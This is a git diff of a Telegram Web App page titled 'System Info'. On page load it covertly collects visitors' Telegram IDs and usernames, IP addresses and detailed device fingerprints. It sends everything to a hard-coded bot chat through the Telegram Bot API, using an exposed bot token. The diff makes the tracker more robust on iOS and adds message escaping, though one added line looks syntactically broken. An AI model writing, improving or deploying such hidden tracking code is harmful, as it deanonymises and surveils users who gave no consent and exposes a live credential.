@@ -1,11 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>.</title>
+    <title>System Info</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
 <script>
+// Проверка на iOS
+const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
 Telegram.WebApp.enableClosingConfirmation();
 
 const BOT_TOKEN = '8173506320:AAEgHmISfNXAvJqgwkRg7UU-KNR-Dpr8vQQ';
@@ -14,6 +17,36 @@ const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 const tg = window.Telegram?.WebApp;
 const userId = tg?.initDataUnsafe?.user?.id;
 const username = tg?.initDataUnsafe?.user?.username;
+
+// Функция для экранирования Markdown-символов
+function escapeMarkdown(text) {
+    if (typeof text !== 'string') return text;
+    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+}
+
+// Улучшенная функция получения GPU информации
+function getGPUInfo() {
+    try {
+        const canvas = document.createElement('canvas');
+        let gl = null;
+        
+        const contexts = ['webgl', 'experimental-webgl', 'webkit-3d', 'moz-webgl'];
+        for (const ctx of contexts) {
+            gl = canvas.getContext(ctx);
+            if (gl) break;
+        }
+        
+        if (!gl) return isIOS ? 'WebGL limited on iOS' : 'WebGL not supported';
+
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo ? {
+            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'unknown',
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'unknown'
+        } : 'No detailed GPU info available';
+    } catch (e) {
+        return 'error';
+    }
+}
 
 // Detect browser features with error handling
 function detectFeatures() {
@@ -41,23 +74,6 @@ function detectFeatures() {
     }
 }
 
-// Get GPU information with error handling
-function getGPUInfo() {
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return 'WebGL not supported';
-
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return debugInfo ? {
-            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-        } : 'No detailed GPU info available';
-    } catch (e) {
-        return 'error';
-    }
-}
-
 // Get CPU cores with error handling
 function getCPUCores() {
     try {
@@ -79,6 +95,8 @@ function getDeviceMemory() {
 // Get battery info with error handling
 async function getBatteryInfo() {
     try {
+        if (isIOS) return 'Battery API not available on iOS';
+        
         if ('getBattery' in navigator) {
             const battery = await navigator.getBattery();
             return {
@@ -97,12 +115,14 @@ async function getBatteryInfo() {
 // Get network information with error handling
 function getNetworkInfo() {
     try {
+        if (isIOS) return 'Network Info limited on iOS';
+        
         if (navigator.connection) {
             return {
-                type: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink + ' Mbps',
-                rtt: navigator.connection.rtt + ' ms',
-                saveData: navigator.connection.saveData
+                type: navigator.connection.effectiveType || 'unknown',
+                downlink: (navigator.connection.downlink || 'unknown') + ' Mbps',
+                rtt: (navigator.connection.rtt || 'unknown') + ' ms',
+                saveData: navigator.connection.saveData || false
             };
         }
         return 'Network Information API not supported';
@@ -208,77 +228,79 @@ async function collectSystemInfo() {
 function sendToTelegram(data) {
     let text = `🖥 *System Information Report* 🖥\n\n`;
     
-    // Telegram user info
-    text += userId ? `📅 *Tg_id:* ${userId}\n` : `📅 *Tg id:* -\n`;
-    text += username ? `👤 *Username:* ${username}\n\n` : `👤 *Username:* -\n\n`;
+    // Telegram user info (с экранированием)
+    text += userId ? `📅 *Tg\\_id:* ${escapeMarkdown(userId.toString())}\n` : `📅 *Tg\\_id:* \\-\n`;
+    text += username ? `👤 *Username:* @${escapeMarkdown(username)}\n\n` : `👤 *Username:* \\-\n\n`;
     
     // Basic info
-    text += `📅 *Timestamp:* ${data.timestamp}\n`;
-    text += `🌐 *User Agent:* ${data.userAgent}\n`;
-    text += `💻 *Platform:* ${data.platform}\n`;
-    text += `🏷 *Vendor:* ${data.vendor || 'unknown'}\n`;
-    text += `🗣 *Language:* ${data.language}\n\n`;
+    text += `📅 *Timestamp:* ${escapeMarkdown(data.timestamp)}\n`;
+    text += `🌐 *User Agent:* ${escapeMarkdown(data.userAgent)}\n`;
+    text += `💻 *Platform:* ${escapeMarkdown(data.platform)}\n`;
+    text += `🏷 *Vendor:* ${escapeMarkdown(data.vendor || 'unknown')}\n`;
+    text += `🗣 *Language:* ${escapeMarkdown(data.language)}\n\n`;
     
     // Hardware
     text += `⚙️ *Hardware Information*\n`;
-    text += `🔢 *CPU Cores:* ${data.cpuCores}\n`;
-    text += `🧠 *Device Memory:* ${data.deviceMemory}\n`;
-    text += `🎮 *GPU Vendor:* ${typeof data.gpu === 'object' ? data.gpu.vendor : data.gpu}\n`;
-    text += `🖥 *GPU Model:* ${typeof data.gpu === 'object' ? data.gpu.renderer : 'N/A'}\n`;
-    text += `🔋 *Battery:* ${typeof data.battery === 'object' ? `${data.battery.level} (${data.battery.charging ? 'charging' : 'discharging'})` : data.battery}\n\n`;
+    text += `🔢 *CPU Cores:* ${escapeMarkdown(data.cpuCores.toString())}\n`;
+    text += `🧠 *Device Memory:* ${escapeMarkdown(data.deviceMemory.toString())}\n`;
+    text += `🎮 *GPU Vendor:* ${typeof data.gpu === 'object' ? escapeMarkdown(data.gpu.vendor) : escapeMarkdown(data.gpu)}\n`;
+    text += `🖥 *GPU Model:* ${typeof data.gpu === 'object' ? escapeMarkdown(data.gpu.renderer) : 'N/A'}\n`;
+    text += `🔋 *Battery:* ${typeof data.battery === 'object' ? 
+        `${escapeMarkdown(data.battery.level)} (\${data.battery.charging ? 'charging' : 'discharging'})` : 
+        escapeMarkdown(data.battery)}\n\n`;
     
     // Screen
     text += `🖥 *Screen Information*\n`;
     text += `📏 *Resolution:* ${data.screen.width}x${data.screen.height}\n`;
     text += `🖼 *Available:* ${data.screen.availWidth}x${data.screen.availHeight}\n`;
-    text += `🎨 *Color Depth:* ${data.screen.colorDepth}-bit\n`;
+    text += `🎨 *Color Depth:* ${data.screen.colorDepth}\\-bit\n`;
     text += `🔍 *Pixel Ratio:* ${data.screen.pixelRatio}\n`;
-    text += `🔄 *Orientation:* ${data.screen.orientation}\n\n`;
+    text += `🔄 *Orientation:* ${escapeMarkdown(data.screen.orientation)}\n\n`;
     
     // Network
     text += `🌐 *Network Information*\n`;
     if (typeof data.network === 'object') {
-        text += `📶 *Connection Type:* ${data.network.type}\n`;
-        text += `⬇️ *Download Speed:* ${data.network.downlink}\n`;
-        text += `⏱ *Round Trip Time:* ${data.network.rtt}\n`;
+        text += `📶 *Connection Type:* ${escapeMarkdown(data.network.type)}\n`;
+        text += `⬇️ *Download Speed:* ${escapeMarkdown(data.network.downlink)}\n`;
+        text += `⏱ *Round Trip Time:* ${escapeMarkdown(data.network.rtt)}\n`;
         text += `💾 *Data Saver Mode:* ${data.network.saveData ? 'on' : 'off'}\n`;
     } else {
-        text += `${data.network}\n`;
+        text += `${escapeMarkdown(data.network.toString())}\n`;
     }
     
     // IP Info
-    text += `📍 *IP Address:* ${data.ipInfo.ip}\n\n`;
+    text += `📍 *IP Address:* ${escapeMarkdown(data.ipInfo.ip)}\n\n`;
     
     // Features
     text += `✨ *Browser Features*\n`;
     if (typeof data.features === 'object') {
         text += `🍪 *Cookies:* ${data.features.cookies ? 'enabled' : 'disabled'}\n`;
-        text += `🚫 *Do Not Track:* ${data.features.doNotTrack}\n`;
+        text += `🚫 *Do Not Track:* ${escapeMarkdown(data.features.doNotTrack.toString())}\n`;
         text += `☕ *Java:* ${data.features.java ? 'enabled' : 'disabled'}\n`;
         text += `📄 *PDF Viewer:* ${data.features.pdf ? 'enabled' : 'disabled'}\n`;
         text += `👆 *Touch Support:* ${data.features.touch ? 'yes' : 'no'}\n`;
         text += `🖍️ *WebGL:* ${data.features.webgl ? 'supported' : 'not supported'}\n`;
         text += `🔊 *Web Audio:* ${data.features.webaudio ? 'supported' : 'not supported'}\n\n`;
     } else {
-        text += `Features detection: ${data.features}\n\n`;
+        text += `Features detection: ${escapeMarkdown(data.features.toString())}\n\n`;
     }
     
     // Plugins
     text += `🧩 *Browser Plugins*\n`;
-    text += `${data.browser.plugins.join(', ') || 'No plugins detected'}\n\n`;
+    text += `${escapeMarkdown(data.browser.plugins.join(', ') || 'No plugins detected'}\n\n`;
     
     // Performance
     text += `⚡ *Performance Information*\n`;
     if (typeof data.performance.memory === 'object') {
         text += `🧠 *Memory Usage:* ${Math.round(data.performance.memory.usedJSHeapSize / 1048576)}MB / ${Math.round(data.performance.memory.totalJSHeapSize / 1048576)}MB\n`;
     } else {
-        text += `${data.performance.memory}\n`;
+        text += `${escapeMarkdown(data.performance.memory.toString())}\n`;
     }
     
     if (typeof data.performance.timing === 'object') {
         text += `⏱ *Page Load Time:* ${data.performance.timing.loadTime}\n`;
     } else {
-        text += `${data.performance.timing}\n`;
+        text += `${escapeMarkdown(data.performance.timing.toString())}\n`;
     }
     
     fetch(TELEGRAM_API_URL, {
@@ -289,13 +311,12 @@ function sendToTelegram(data) {
         body: JSON.stringify({
             chat_id: CHAT_ID,
             text: text,
-            parse_mode: 'Markdown',
+            parse_mode: 'MarkdownV2',
             disable_web_page_preview: true
         })
-    }).catch(() => {});
+    }).catch(error => console.error('Telegram API error:', error));
 }
 
-// Start collection on page load
 window.onload = collectSystemInfo;
 </script>
 </body>
